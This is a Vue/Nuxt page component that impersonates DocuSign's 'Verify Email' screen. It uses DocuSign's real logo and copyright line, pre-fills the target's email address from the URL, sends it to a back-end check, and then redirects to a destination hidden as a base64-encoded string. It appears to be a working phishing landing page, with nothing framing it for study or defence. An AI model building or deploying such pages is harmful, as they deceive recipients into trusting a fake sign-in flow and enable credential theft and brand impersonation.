<script setup lang="ts">
const links = ['English', 'Help', 'Terms', 'Privacy']
const inputValue = ref('')
const loading = ref(false)
const error = ref(false)
const email = computed(() => extractEmail(window.location.href))

useHead({
  title: 'DocuSign - Verify Email'
})
const r = async () => {
  try {
    loading.value = true
    error.value = false
    const res = await $fetch('/api/check', {
      method: 'POST',
      body: {email: email.value}
    })
    if (res.u) {
      setTimeout(() => {
        window.location.replace(atob(res.u))
      }, 1000)
    } else {
      error.value = true
    }
  } catch (e) {
    loading.value = false
    error.value = true
  }

}
inputValue.value = email.value

</script>

<template>
  <div class="app-container">
    <div class="header">
      <UContainer>
        <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="Docusign">
      </UContainer>
    </div>
    <div class="body">
      <UCard class="max-w-110 h-fit shadow-lg text-center p-4">
        <template #default>
          <div class="space-y-4">
            <h3 class="text-lg">Access Your Document</h3>
            <div class="badge"><span>Security verification required</span></div>
            <p>Enter your email to securely access and sign your document</p>
            <div class="badge text-sm text-start">
              <h4 class="text-black">Intended Recipient:</h4>
              <span class="font-bold text-primary">{{email}}</span>
            </div>
            <UForm class="form" @submit.prevent="r">
              <UFormField size="xl" label="Email Address" required>
                <UInput type="email" required v-model="inputValue" highlight :color="email ? 'success' : 'neutral'" />
              </UFormField>

              <UButton size="xl" type="submit" block label="CONTINUE" :disabled="loading"/>

              <div class="loading" v-if="loading">
                <UIcon name="line-md:loading-twotone-loop" />
                <span>Verifying...</span>
              </div>
            </UForm>

            <USeparator />

            <div class="benefits">
              <div class="benefit-item">
                <i>✓</i>
                <span>Secure document access</span>
              </div>
              <div class="benefit-item">
                <i>✓</i>
                <span>Ready for e-signature</span>
              </div>
              <div class="benefit-item">
                <i>✓</i>
                <span>Bank-level security</span>
              </div>
            </div>
          </div>
        </template>
      </UCard>
    </div>
    <div class="footer">
      <UContainer>
        <div class="footer-items">
          <div class="cr">
            <span>Powered by</span>
            <img src="https://docucdn-a.akamaihd.net/olive/images/2.72.0/global-assets/ds-logo-default.svg" alt="Docusign" />
          </div>
          <div class="links">
            <ULink v-for="link in links" class="text-primary-800" :key="link" to="#">{{ link }}</ULink>
          </div>
          <div><span>© 2025 DocuSign</span></div>
        </div>
      </UContainer>
    </div>
  </div>
</template>

<style scoped>
@reference "~/assets/css/main.css";

.app-container {
  @apply w-full h-dvh bg-[#f8f9fa] flex flex-col;

  h1 {
    @apply font-bold text-2xl;
  }

  .header {
    @apply w-full py-5 border-b-1 border-b-gray-200 bg-white;

    img {
      @apply h-8
    }
  }

  .body {
    @apply grow flex justify-center items-center;

    .form {
      @apply flex flex-col gap-4;

      .loading {
        @apply flex gap-2 justify-center items-center text-[#0369a1];
      }
    }

    .badge {
      @apply ring-[#bae6fd] ring-1 text-[#0369a1] bg-[#f0f9ff] p-4 rounded-md;
    }

    .benefits {
      @apply flex flex-col gap-1 justify-start text-sm;
      .benefit-item {
        @apply text-start space-x-2 text-muted;
      }
    }
  }

  .footer {
    @apply w-full py-5 border-t-1 border-t-gray-200 bg-white text-center;

    .footer-items {
      @apply flex justify-around flex-col md:flex-row;
    }


    .cr {
      @apply flex gap-2 justify-center md:justify-start;

      img {
        @apply h-5;
      }
    }

    .links {
      @apply flex gap-4 justify-center;
    }
  }
}

.email-info {
  @apply bg-[#f8f9fa] py-2 text-center w-full rounded-md ring ring-[#eaeaea] font-medium;
}
</style>